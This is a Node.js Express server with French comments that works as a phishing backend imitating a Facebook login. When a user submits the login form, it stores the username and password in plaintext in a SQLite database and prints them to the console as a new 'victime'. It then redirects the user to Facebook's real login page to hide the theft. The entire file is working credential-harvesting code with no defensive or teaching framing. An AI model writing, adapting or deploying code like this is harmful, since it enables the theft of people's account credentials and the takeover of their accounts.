const express = require('express');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const db = new sqlite3.Database('./users.db');

const port = 8000;
const ip = "192.168.1.188";

// middleware pour traiter les donner du formulaire
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static('public'));

db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT
)`);

// rout pour afficher la page de connexion
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});


app.post('/login', (req, res) => {
    const { username, password } = req.body;

    db.run(`INSERT INTO users (username, password) VALUES (?, ?)`, [username, password], function(err){
        if (err){
            return console.error(err.message);
        }
        console.log(`Une nouvelle victime a été ajouté :\nPseudo : ${username}\nPassword : ${password}\n\n`);
        res.writeHead(301,{Location: 'https://fr-fr.facebook.com/login/?locale=fr_FR'}); // redirection sur le site de facebook
        res.end();
    });
});


app.listen(port, ip,  () => {
    console.log(`Serveur running at http://${ip}:${port}\n`);
});
